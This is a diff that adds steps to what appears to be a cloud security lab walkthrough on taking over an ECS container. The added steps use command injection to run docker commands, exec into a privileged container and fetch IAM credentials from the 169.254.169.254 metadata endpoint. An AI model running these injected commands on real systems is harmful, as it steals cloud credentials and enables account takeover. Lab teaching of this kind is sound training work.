@@ -1304,3 +1304,31 @@ docker ps
 <p align="center">
   <img src="/images/cloud/docker_ps.png">
 </p>
+
+* Grep the privd container details.
+
+```bash
+; docker ps | grep privd
+```
+
+<p align="center">
+  <img src="/images/cloud/container_id.png">
+</p>
+
+* Using command injection get the container credentials for the privd container.
+
+```bash
+; docker exec <privd container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/'
+```
+
+<p align="center">
+  <img src="/images/cloud/ecs_takeover_agent.png">
+</p>
+
+```bash
+; docker exec <privd container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/<your-specific-ecs-agent>'
+```
+
+<p align="center">
+  <img src="/images/cloud/aws_ecs_keys.png">
+</p>
